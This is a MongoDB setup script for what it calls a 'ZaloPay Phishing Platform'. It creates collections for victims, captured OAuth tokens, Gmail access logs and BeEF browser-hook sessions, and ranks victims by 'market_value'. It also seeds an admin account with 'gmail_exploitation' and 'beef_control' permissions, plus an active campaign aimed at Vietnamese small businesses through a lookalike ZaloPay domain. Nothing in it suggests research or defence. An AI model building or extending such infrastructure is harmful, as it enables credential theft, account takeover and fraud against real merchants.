// MongoDB initialization script for ZaloPay Phishing Platform
// This script runs during MongoDB container startup

// Switch to the application database
db = db.getSiblingDB('zalopay_phishing');

// Create collections with appropriate indexes
db.createCollection('victims');
db.createCollection('oauth_tokens');
db.createCollection('admin_users');
db.createCollection('campaigns');
db.createCollection('activity_logs');
db.createCollection('gmail_access_logs');
db.createCollection('beef_sessions');

// Create indexes for victims collection
db.victims.createIndex({"email": 1}, {"unique": true});
db.victims.createIndex({"capture_timestamp": -1});
db.victims.createIndex({"validation.market_value": 1, "validation.status": 1});
db.victims.createIndex({"campaign_id": 1, "capture_timestamp": -1});

// Create indexes for oauth_tokens collection
db.oauth_tokens.createIndex({"victim_id": 1});
db.oauth_tokens.createIndex({"provider": 1, "token_metadata.token_status": 1});
db.oauth_tokens.createIndex({"expires_at": 1}, {"expireAfterSeconds": 0});

// Create indexes for admin_users collection
db.admin_users.createIndex({"username": 1}, {"unique": true});
db.admin_users.createIndex({"email": 1}, {"unique": true});
db.admin_users.createIndex({"role": 1, "is_active": 1});

// Create indexes for campaigns collection
db.campaigns.createIndex({"code": 1}, {"unique": true});
db.campaigns.createIndex({"status": 1, "timeline.actual_start": -1});

// Create indexes for activity_logs collection
db.activity_logs.createIndex({"actor.admin_id": 1, "timestamp": -1});
db.activity_logs.createIndex({"action_type": 1, "timestamp": -1});
db.activity_logs.createIndex({"target.resource_type": 1, "target.resource_id": 1});

// Create indexes for gmail_access_logs collection
db.gmail_access_logs.createIndex({"admin_id": 1, "created_at": -1});
db.gmail_access_logs.createIndex({"victim_id": 1, "created_at": -1});

// Create indexes for beef_sessions collection
db.beef_sessions.createIndex({"hook_id": 1}, {"unique": true});
db.beef_sessions.createIndex({"victim_id": 1, "created_at": -1});

// Create application admin user
db.admin_users.insertOne({
  "username": "admin",
  "email": "admin@zalopaymerchan.com",
  "password_hash": "$2b$12$LQv3c1yqBwmnJ21x7L2YsO.W3E5Q5F5F5F5F5F5F5F5F5F5F5F5F5",
  "role": "admin",
  "permissions": [
    "dashboard_view",
    "victim_management",
    "gmail_exploitation",
    "beef_control",
    "campaign_management",
    "data_export",
    "system_monitoring"
  ],
  "is_active": true,
  "created_at": new Date(),
  "updated_at": new Date()
});

// Create sample campaign
db.campaigns.insertOne({
  "name": "ZaloPay Merchant Q4 2025 - Vietnamese SME",
  "code": "ZPM_Q4_2025_VN_SME",
  "status": "active",
  "config": {
    "target_domains": ["zalopaymerchan.com"],
    "geographic_targeting": {
      "primary_countries": ["VN"]
    }
  },
  "created_at": new Date(),
  "updated_at": new Date()
});

print("MongoDB initialization completed successfully!");
print("Created collections with indexes and initial admin user");
